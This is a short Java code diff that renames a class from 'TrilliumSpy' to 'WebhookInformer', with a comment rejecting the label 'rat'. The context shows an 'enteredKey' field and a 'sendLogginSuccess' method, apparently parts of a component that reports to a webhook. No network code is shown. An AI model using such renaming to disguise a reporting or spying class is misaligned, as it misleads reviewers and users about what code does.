@@ -13,7 +13,7 @@ import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
-public class TrilliumSpy { // If u call this class rat then pls get brain
+public class WebhookInformer { // If u call this class rat then pls get brain
 	public static String enteredKey = "";
 	
     public static void sendLogginSuccess() {
